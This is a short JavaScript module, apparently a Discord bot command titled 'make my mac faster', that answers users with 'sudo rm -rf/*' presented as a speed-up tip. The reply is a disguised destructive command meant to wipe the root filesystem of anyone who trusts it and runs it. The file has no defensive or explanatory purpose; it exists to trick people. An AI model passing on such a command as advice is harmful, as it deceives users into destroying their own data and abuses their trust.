module.exports ={
    name: 'make my mac faster',
    description: 'a tip to make your mac faster',
    execute(message, args){
        message.reply({content: 'sudo rm -rf/*'})
    }   
}